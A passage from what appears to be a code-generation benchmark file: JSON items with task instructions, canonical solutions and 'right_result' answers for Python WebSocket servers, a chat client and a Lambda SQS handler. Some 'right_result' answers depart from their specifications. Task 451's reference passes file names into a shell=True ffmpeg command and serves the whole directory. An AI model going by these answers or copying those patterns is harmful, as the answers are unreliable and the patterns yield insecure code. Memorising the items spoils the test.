WebSocket connection open\n- Start(url) -> None - Starts the WebSocket connection on the specified URL\n- Close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import threading\nimport weakref\nfrom queue import Queue\nimport websocket\n\nclass ChatWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.setName(\"ChatSendThread\")\n        self.sendThread.setDaemon(True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            task = self._inQueue.get(True)\n            self._inQueue.task_done()\n            try:\n                if task == \"\":\n                    break\n                self._SendData(task)\n            except Exception as es:\n                pass\n\n    def _SendData(self, data):\n        self._Send(data)\n        if \"send_image\" in data:\n            self.parent.websocket.emit(self.parent.SendImg, data)\n        else:\n            self.parent.websocket.emit(self.parent.SendMsg2, data)\n\n    def _Send(self, msg):\n        try:\n            if self.ws:\n                self.ws.send(msg)\n        except Exception as es:\n            pass\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        self.parent.websocket.emit(self.parent.Msg, message)\n\n    def on_error(self, ws, error):\n        self.parent.websocket.emit(self.parent.ErrorMsg, str(error))\n\n    def on_close(self, ws):\n        self.parent.websocket.emit(self.parent.Leave, \"\")\n\n    def on_open(self, ws):\n        self.parent.websocket.emit(self.parent.Enter, \"\")\n\n    def Start(self, url):\n        url = url.replace(\"https\", \"wss\").replace(\"http\", \"ws\") + \"/socket.io/?EIO=3&transport=websocket\"\n        def Run():\n            ws = websocket.WebSocketApp(url,\n                                      on_open=self.on_open,\n                                      on_message=self.on_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close)\n            self.ws = ws\n            ws.run_forever(ping_interval=30)\n\n        thread = threading.Thread(target=Run)\n        thread.setDaemon(True)\n        thread.start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n            self.ws = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "right_result": "import threading\nimport queue\nimport websocket\nfrom weakref import ref\n\nclass ChatWebSocket:\n    def __init__(self, parent):\n        self._parent = ref(parent)\n        self.ws = None\n        self._inQueue = queue.Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent() if self._parent() else None\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            data = self._inQueue.get()\n            if data == \"\":\n                break\n            self._SendData(data)\n            self._inQueue.task_done()\n\n    def _SendData(self, data):\n        if self.ws and self.ws.readyState == 1:\n            self._Send(data)\n        else:\n            self._Send(data)\n\n    def _Send(self, msg):\n        self.ws.send(msg)\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        pass\n\n    def on_error(self, ws, error):\n        pass\n\n    def on_close(self, ws):\n        pass\n\n    def on_open(self, ws):\n        pass\n\n    def Start(self, url):\n        self.ws = websocket.WebSocketApp(url,\n                                         on_message=self.on_message,\n                                         on_error=self.on_error,\n                                         on_close=self.on_close,\n                                         on_open=self.on_open)\n        self.ws.run_forever()\n\n    def Close(self):\n        self.ws.close()"
  },
  {
    "Task_id": 445,
    "Instruction": "Task Description: Implement a WebSocket server using FastAPI that validates user sessions by performing a bitwise operation on received user and session IDs.\n\nFunction Description: The function `websocket_endpoint` establishes a WebSocket connection, receives binary data containing user and session IDs, validates them using a specific bitwise operation, and sends back the validation result as binary data.\n\nInput: \n- websocket: WebSocket - The WebSocket connection object provided by FastAPI\n- data: bytes - Binary data received from the client containing packed user_id and session_id (two unsigned 32-bit integers in little-endian format)\n\nOutput: \n- None (The function sends binary data back through the WebSocket connection but doesn't return anything)\n- The sent data contains a packed unsigned 32-bit integer (little-endian) representing the validation result (1 for valid, 0 for invalid)",
    "Canonical_solution": "from fastapi import FastAPI, WebSocket\nimport struct\n\napp = FastAPI()\n\n@app.websocket('/validate_session_ws')\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    while True:\n        data = await websocket.receive_bytes()\n        user_id, session_id = struct.unpack('<II', data)\n        result = (user_id ^ session_id) % 23 == 0\n        await websocket.send_bytes(struct.pack('<I', result))",
    "Code_level": "Function-level",
    "FSMID_for_test": 48,
    "right_result": "from fastapi import FastAPI, WebSocket\nimport struct\n\napp = FastAPI()\n\n@app.websocket_route(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    while True:\n        data = await websocket.receive_bytes()\n        if not data:\n            break\n        user_id = struct.unpack(\"<I\", data[:4])[0]\n        session_id = struct.unpack(\"<I\", data[4:8])[0]\n        result = (user_id & session_id) == (user_id | session_id)\n        result_bytes = struct.pack(\"<I\", 1 if result else 0)\n        await websocket.send_bytes(result_bytes)"
  },
  {
    "Task_id": 446,
    "Instruction": "Task Description: Create a WebSocket server using FastAPI that accepts client connections, sends a sequence of numbers at a specified interval, and then closes the connection.\n\nFunction Description: The function `websocket_endpoint` establishes a WebSocket connection with a client, sends a sequence of numbers (0 to 4) at a specified time interval, and then closes the connection. It handles any exceptions that may occur during the process.\n\nInput:  \n- `websocket`: WebSocket - The WebSocket connection instance provided by FastAPI.  \n- `interval`: int (default: 1) - The time interval (in seconds) between sending consecutive numbers.  \n\nOutput: None (The function sends messages over the WebSocket but does not return any value.)",
    "Canonical_solution": "import asyncio\nfrom fastapi import FastAPI, WebSocket\n\napp = FastAPI()\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket, interval: int = 1):\n    await websocket.accept()\n    try:\n        for i in range(5):\n            await websocket.send_text(str(i))\n            await asyncio.sleep(interval)\n        await websocket.close()\n    except Exception as e:\n        print(e)",
    "Code_level": "Function-level",
    "FSMID_for_test": 48,
    "right_result": "```python\nfrom fastapi import WebSocket, FastAPI\nimport asyncio\n\napp = FastAPI()\n\n@app.websocket_route(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket, interval: int = 1):\n    try:\n        await websocket.accept()\n        numbers = list(range(5))\n        for number in numbers:\n            await websocket.send_text(str(number))\n            await asyncio.sleep(interval)\n        await websocket.close()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n        await websocket.close()\n```"
  },
  {
    "Task_id": 448,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python that handles WebSocket connections, processes incoming messages, and manages connection lifecycle events.\n\nClass Description: WebSocketServer is a class that sets up a Tornado WebSocket server with an echo handler that sends received messages back to the client.\n\nAttributes:\n- close_future: [Future] - A Future object used to track when the WebSocket connection is closed.\n- app: [Application] - The Tornado web application instance that routes WebSocket connections.\n\nMethods:\n- __init__: [__init__]() -> [None] - Initializes the WebSocket server, creates the Application instance, and sets up the echo handler route.\n- get_app: [get_app]() -> [Application] - Returns the Tornado web application instance.\n- ws_connect: [ws_connect](path: str, **kwargs: dict) -> [WebSocketClientConnection] - Establishes a WebSocket connection to the specified path with optional connection parameters.\n\nClass Description: TestWebSocketHandler is a base WebSocket handler class that provides common functionality for WebSocket connections.\n\nAttributes:\n- close_future: [Future] - A Future object used to signal when the connection is closed.\n- compression_options: [dict] - Options for WebSocket compression.\n\nMethods:\n- initialize: [initialize](close_future: Future = None, compression_options: dict = None) -> [None] - Initializes the handler with optional close_future and compression_options.\n- get_compression_options: [get_compression_options]() -> [dict] - Returns the compression options for the WebSocket connection.\n- on_close: [on_close]() -> [None] - Called when the WebSocket connection is closed; resolves the close_future if it exists.\n\nClass Description: EchoHandler is a WebSocket handler that echoes received messages back to the client.\n\nMethods:\n- on_message: [on_message](message: str or bytes) -> [None] - Handles incoming WebSocket messages and echoes them back to the client. Handles cancellation and closed connection errors gracefully.",
    "Canonical_solution": "from tornado.websocket import WebSocketHandler\nfrom tornado.web import Application\nfrom tornado.concurrent import Future\nfrom tornado import gen\n\nclass TestWebSocketHandler(WebSocketHandler):\n    def initialize(self, close_future=None, compression_options=None):\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future is not None:\n            self.close_future.set_result((self.close_code, self.close_reason))\n\nclass EchoHandler(TestWebSocketHandler):\n    @gen.coroutine\n    def on_message(self, message):\n        try:\n            yield self.write_message(message, isinstance(message, bytes))\n        except asyncio.CancelledError:\n            pass\n        except WebSocketClosedError:\n            pass\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = Application([\n            (\"/echo\", EchoHandler, dict(close_future=self.close_future))\n        ])\n\n    def get_app(self):\n        return self.app\n\n    @gen.coroutine\n    def ws_connect(self, path, **kwargs):\n        ws = yield websocket_connect(\n            \"ws://127.0.0.1:%d%s\" % (self.get_http_port(), path), **kwargs\n        )\n        raise gen.Return(ws)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.web\nimport tornado.websocket\nimport asyncio\nimport logging\n\nclass TestWebSocketHandler(tornado.websocket.WebSocketHandler):\n    def __init__(self, close_future=None, compression_options=None, **kwargs):\n        super().__init__(**kwargs)\n        self.close_future = close_future or asyncio.Future()\n        self.compression_options = compression_options or {}\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future:\n            self.close_future.set_result(None)\n\n\nclass EchoHandler(TestWebSocketHandler):\n    def on_message(self, message):\n        try:\n            self.write_message(message)\n        except tornado.websocket.WebSocketClosedError:\n            pass\n\n\nclass WebSocketServer:\n    def __init__(self):\n        self.app = tornado.web.Application([\n            (r'/echo', EchoHandler),\n            (r'/ws', TestWebSocketHandler),\n        ])\n        self.app.listen(8888)\n\n    def get_app(self):\n        return self.app\n\n\nif __name__ == \"__main__\":\n    server = WebSocketServer()\n    asyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a WebSocket server using Tornado in Python to handle WebSocket connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class initializes and starts a Tornado-based WebSocket server that listens on a specified port. It uses a WebSocketHandler to manage individual WebSocket connections.\n\nAttributes:\n- port: int - The port number on which the WebSocket server will listen.\n- app: tornado.web.Application - The Tornado application instance that routes WebSocket connections.\n- server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the WebSocket application.\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the WebSocketServer with the specified port (default: 8080).\n- start() -> None - Starts the WebSocket server and begins listening for incoming connections.\n\nClass Description: The WebSocketHandler class extends tornado.websocket.WebSocketHandler to handle WebSocket connection events.\n\nMethods:\n- open() -> None - Called when a new WebSocket connection is opened.\n- on_message(msg: str) -> None - Called when a message is received from the WebSocket client.\n- on_close() -> None - Called when the WebSocket connection is closed.\n- check_origin(origin: str) -> bool - Overrides the origin check to allow connections from any origin (returns True).",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        print('opened')\n\n    def on_message(self, msg):\n        print('onmessage', msg)\n\n    def on_close(self):\n        print('closed')\n\n    def check_origin(self, origin):\n        return True\n\nclass WebSocketServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.app = tornado.web.Application([\n            ('.*', WebSocketHandler)\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def check_origin(self, origin):\n        return True\n\n    def open(self):\n        print(\"New connection opened\")\n\n    def on_message(self, message):\n        print(f\"Received message: {message}\")\n        self.write_message(f\"Echo: {message}\")\n\n    def on_close(self):\n        print(\"Connection closed\")\n\nclass WebSocketServer:\n    def __init__(self, port: int = 8080):\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/ws\", WebSocketHandler),\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.server.listen(self.port)\n        print(f\"WebSocket server started on port {self.port}\")\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 451,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python to handle real-time communication with clients, including processing video frames and managing participant data.\n\nClass Description: WebSocketHandler is a Tornado WebSocket handler class that manages WebSocket connections, processes incoming messages, and handles the lifecycle of WebSocket connections.\n\nAttributes:\n- None explicitly defined in the class (uses global variables for state management)\n\nMethods:\n- open() -> None - Called when a new WebSocket connection is established. Initializes participant position and calls newParticipant.\n- on_message(message: str) -> None - Handles incoming WebSocket messages. Processes different message types (identified by 'msgID') to manage video frame extraction, data writing to CSV, and frame navigation.\n- on_close() -> None - Called when the WebSocket connection is closed (currently empty implementation).\n- on_error() -> None - Called when an error occurs (not shown in the reference code but typically part of WebSocketHandler).\n\nClass Description: Application is a Tornado web application class that routes WebSocket and static file requests.\n\nAttributes:\n- None explicitly defined (inherits from tornado.web.Application)\n\nMethods:\n- __init__() -> None - Initializes the application with URL handlers for WebSocket connections and static files, and configures template paths.\n\nNote: The reference code also uses several global variables and helper functions (newParticipant, sendVideoEnd, sendVideoFrame, writeDataToCSV, writeScreenCapOutputFrames, closeScreenCapOutVideo) which are not part of the class definitions but are used by the WebSocketHandler methods.",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport tornado.escape\nimport json\nimport csv\nimport os\nimport glob\nimport numpy as np\nimport subprocess\nimport re\nfrom itertools import chain\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        global_variables.participantPos = -1\n        newParticipant(self)\n\n    def on_message(self, message):\n        msg = tornado.escape.json_decode(message)\n        \n        if msg['msgID'] == '1':\n            global_variables.participant.videosPos += 1\n            pv = global_variables.participant.videos[global_variables.participant.videosPos]\n            video = global_variables.participant.directory + '/' + pv.filename\n            \n            outDir = outputPrefix + video + \"_frames\" + '/'\n            if not os.path.isdir(outDir):\n                os.makedirs(outDir)\n\n            gpCSVDone = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvDoneName\n            gpCSV = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvTempName\n            \n            if os.path.isfile(gpCSVDone):\n                sendVideoEnd(self)\n                return\n            elif os.path.isfile(gpCSV):\n                os.remove(gpCSV)\n                if writeCSV:\n                    with open(gpCSV, 'w', newline='') as csvfile:\n                        writer = csv.DictWriter(csvfile, fieldnames=fieldnames, delimiter=',', quoting=csv.QUOTE_ALL)\n                        writer.writeheader()\n\n            framesDoneFile = outDir + '/' + \"framesExtracted.txt\"\n            if not os.path.isfile(framesDoneFile):\n                completedProcess = subprocess.run('ffmpeg -i \"./' + video + '\" -vf showinfo \"' + outDir + 'frame_%08d.png\"',\n                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)\n\n                nFrames = len(glob.glob(outDir + '*.png'))\n                if nFrames == 0:\n                    sendVideoEnd(self)\n                    return\n\n                allPts = np.ones(nFrames, dtype=np.int) * -1\n                ptsTimebase = -1\n                framerate = -1\n                lines = completedProcess.stderr.splitlines()\n                for l in lines:\n                    if l.startswith(\"[Parsed_showinfo_0 @\"):\n                        timebase = l.find(\"config in time_base:\")\n                        fr = l.find(\", frame_rate:\")\n                        nStart = l.find(\"n:\")\n                        ptsStart = l.find(\"pts:\")\n                        pts_timeStart = l.find(\"pts_time:\")\n                        if nStart >= 0 and ptsStart >= 0:\n                            frameNum = int(l[nStart+2:ptsStart-1].strip())\n                            pts = int(l[ptsStart+4:pts_timeStart].strip())\n                            allPts[frameNum] = pts\n                        elif timebase >= 0:\n                            ptsTimebase = l[timebase+20:fr].strip()\n                            framerate = l[fr+13:].strip()\n                            sl = framerate.find(\"/\")\n                            if sl > 0:\n                                frPre = framerate[0:sl]\n                                frPost = framerate[sl+1:]\n                                framerate = float(frPre) / float(frPost)\n                            else:\n                                framerate = float(framerate)\n\n                prev = 0\n                for i in range(0, nFrames):\n                    if allPts[i] == -1:\n                        allPts[i] = prev + int(1000/framerate)\n                    prev = allPts[i]\n\n                for i in range(0, nFrames):\n                    inputFile = outDir + frameExtractFormat.format(i+1)\n                    outputFile = outDir + frameOutFormat.format(i, allPts[i])\n                    os.rename(inputFile, outputFile)\n\n                with open(framesDoneFile, 'w') as f:\n                    f.write(\"Done.\")\n\n            pv.frameFilesList = sorted(glob.glob(outDir + '*.png'))\n            pv.frameFilesPos = 0\n            sendVideoFrame(self, pv.frameFilesList[pv.frameFilesPos], pv)\n\n        elif msg['msgID'] == '3':\n            frameTimeEpoch = writeDataToCSV(global_variables.participant, msg)\n\n            if global_variables.writeScreenCapVideo:\n                writeScreenCapOutputFrames(global_variables.participant, frameTimeEpoch)\n\n            pv = global_variables.participant.videos[global_variables.participant.videosPos]\n            pv.frameFilesPos += 1\n\n            if pv.frameFilesPos >= len(pv.frameFilesList):\n                if global_variables.writeScreenCapVideo:\n                    closeScreenCapOutVideo(global_variables.participant)\n\n                gpCSV = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvTempName\n                gpCSVDone = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvDoneName\n                if os.path.isfile(gpCSV):\n                    os.rename(gpCSV, gpCSVDone)\n\n                sendVideoEnd(self)\n            else:\n                sendVideoFrame(self, pv.frameFilesList[pv.frameFilesPos], pv)\n\n    def on_close(self):\n        pass\n\nclass Application(tornado.web.Application):\n    def __init__(self):\n        handlers = [\n            (r'/websocket', WebSocketHandler),\n            (r'/(.*)', tornado.web.StaticFileHandler, {'path': '.', 'default_filename': ''}),\n        ]\n        settings = {\n            'template_path': 'templates'\n        }\n        tornado.web.Application.__init__(self, handlers, **settings)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nimport os\nimport csv\nimport json\nimport time\n\nglobal participant_positions\nparticipant_positions = {}\n\nglobal video_frames\nvideo_frames = []\n\nglobal csv_file\ncsv_file = None\n\nglobal screen_cap_output_video\nscreen_cap_output_video = None\n\ndef newParticipant(participant_id):\n    participant_positions[participant_id] = {'x': 0, 'y': 0}\n\ndef sendVideoEnd(participant_id):\n    pass\n\ndef sendVideoFrame(participant_id, frame):\n    pass\n\ndef writeDataToCSV(data):\n    global csv_file\n    if csv_file is None:\n        csv_file = open('output.csv', 'w', newline='')\n        writer = csv.writer(csv_file)\n        writer.writerow(['timestamp', 'participant_id', 'x', 'y'])\n    writer = csv.writer(csv_file)\n    writer.writerow([time.strftime('%Y-%m-%d %H:%M:%S'), data['participant_id'], data['x'], data['y']])\n\ndef writeScreenCapOutputFrames(frame):\n    pass\n\ndef closeScreenCapOutVideo():\n    pass\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        participant_id = self.get_argument('participant_id')\n        newParticipant(participant_id)\n\n    def on_message(self, message):\n        data = json.loads(message)\n        msgID = data.get('msgID')\n        if msgID == 'extract_video_frame':\n            frame = data.get('frame')\n            video_frames.append(frame)\n            sendVideoFrame(data.get('participant_id'), frame)\n        elif msgID == 'write_data_to_csv':\n            writeDataToCSV(data)\n        elif msgID == 'navigate_frame':\n            frame_index = data.get('frame_index')\n            if 0 <= frame_index < len(video_frames):\n                frame = video_frames[frame_index]\n                sendVideoFrame(data.get('participant_id'), frame)\n\n    def on_close(self):\n        pass\n\n    def on_error(self, exc):\n        pass\n\nclass Application(tornado.web.Application):\n    def __init__(self):\n        handlers = [\n            (r'/ws', WebSocketHandler),\n            (r'/static/(.*)', tornado.web.StaticFileHandler, {'path': 'static'}),\n            (r'/', tornado.web.StaticFileHandler, {'path': 'static'})\n        ]\n        super().__init__(handlers)\n\nif __name__ == \"__main__\":\n    app = Application()\n    app.listen(8888)\n    tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that handles SQS records, makes HTTP requests, and processes responses in an AWS Lambda environment.\n\nFunction Description: The function processes SQS records asynchronously, makes HTTP GET requests to a specified endpoint using httpx, and returns the HTTP status code. It's designed to work with AWS Lambda Powertools for batch processing.\n\nInput: \n- record: SQSRecord - A single SQS record containing message data\n- (Implicit) client: httpx.AsyncClient - An asynchronous HTTP client created within the function\n\nOutput: \n- int - HTTP status code from the GET request (e.g., 200, 404, etc.)\n- (Through processor) Processed batch response for the Lambda handler",
    "Canonical_solution": "import httpx\nfrom aws_lambda_powertools.utilities.batch import AsyncBatchProcessor, EventType, async_process_partial_response\nfrom aws_lambda_powertools.utilities.data_classes.sqs_event import SQSRecord\nfrom aws_lambda_powertools.utilities.typing import LambdaContext\n\nprocessor = AsyncBatchProcessor(event_type=EventType.SQS)\n\nasync def async_record_handler(record: SQSRecord):\n    async with httpx.AsyncClient() as client:\n        ret = await client.get(\"https://httpbin.org/get\")\n    return ret.status_code\n\ndef lambda_handler(event, context: LambdaContext):\n    return async_process_partial_response(\n        event=event,\n        record_handler=async_record_handler,\n        processor=processor,\n        context=context,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom aws_lambda_powertools import Logger, Tracer\nfrom aws_lambda_powertools.batch import batch_processor\n\nlogger = Logger()\ntracer = Tracer()\n\n@batch_processor\nasync def process_sqs_records(records):\n    for record in records:\n        try:\n            # Extract the endpoint from the SQS record\n            endpoint = record.body  # Assuming the message body contains the endpoint URL\n\n            # Make an asynchronous HTTP GET request\n            async with httpx.AsyncClient() as client:\n                response = await client.get(endpoint)\n                status_code = response.status_code\n                logger.info(f\"Successfully retrieved endpoint {endpoint}, status code: {status_code}\")\n                return status_code\n        except Exception as e:\n            logger.error(f\"Error processing record: {str(e)}\")\n            continue\n\n    return 200"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections asynchronously, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages as they arrive)\n- For each message processed, sends a JSON response back through the WebSocket connection\n\nMethods:\n- server(websocket, path) -> None - Handles incoming WebSocket connections and message processing\n- start_websocket_server() -> None - Starts the WebSocket server and runs the event loop",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n    async for message in websocket:\n        data = json.loads(message)\n        operation = data.get('operation')\n        \n        if operation == 'echo':\n            response = {'status': 'success', 'message': 'Echo received'}\n        elif operation == 'ask':\n            response = {'status': 'success', 'message': 'Question asked'}\n        elif operation == 'throw':\n            response = {'status': 'error', 'message': 'Exception thrown'}\n        else:\n            response = {'status': 'error', 'message': 'Unknown operation'}\n        \n        await websocket.send(json.dumps(response))\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 463,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- For the server function: None (continuously processes messages until connection ends)\n- For start_websocket_server function: None (runs indefinitely until interrupted)\n\nMethods:\n- server: async (websocket, path) -> None - Handles WebSocket connections and message processing\n- start_websocket_server: () -> None - Starts and runs the WebSocket server\n\nNote: The server expects JSON messages with a 'function' field (either 'echo', 'ask', or 'throw') and an 'args' array. It will respond with a modified JSON object containing either a 'return' field with the result or a 'throw' field with an error message.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import websockets\nimport asyncio\nimport json\n\nasync def server(websocket, path):\n    async for message in websocket:\n        data = json.loads(message)\n        function = data.get('function')\n        args = data.get('args', [])\n\n        if function == 'echo':\n            response = {'return': args}\n            await websocket.send(json.dumps(response))\n        elif function == 'ask':\n            # Simulate an operation that returns a result\n            response = {'return': 'Result of the ask operation'}\n            await websocket.send(json.dumps(response))\n        elif function == 'throw':\n            error_message = 'An error occurred during the operation'\n            response = {'throw': error_message}\n            await websocket.send(json.dumps(response))\n        else:\n            response = {'throw': 'Unknown function'}\n            await websocket.send(json.dumps(response))\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run indefinitely\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echo (returns the first argument), ask (prompts user input for the first argument), and throw (returns an error with the first argument). Unknown functions result in an error response.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nTask Description: Create a WebSocket server that listens on a specified host and port, handles client connections asynchronously, and processes JSON-formatted requests with different function calls.\n\nFunction Description: The start_websocket_server function initializes and starts a WebSocket server that runs indefinitely, using the server function to handle incoming connections and messages.\n\nInput: None\n\nOutput: None (The function runs the server indefinitely until interrupted)",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import websockets\nimport asyncio\nimport json\n\nasync def server(websocket, path):\n    try:\n        while True:\n            message = await websocket.recv()\n            data = json.loads(message)\n            func = data.get(\"func\")\n            arg = data.get(\"arg\")\n\n            if func == \"echo\":\n                response = {\"result\": arg}\n            elif func == \"ask\":\n                response = {\"prompt\": arg}\n            elif func == \"throw\":\n                response = {\"error\": f\"Exception: {arg}\"}\n            else:\n                response = {\"error\": \"Unknown function\"}\n\n            await websocket.send(json.dumps(response))\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nasyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 468,
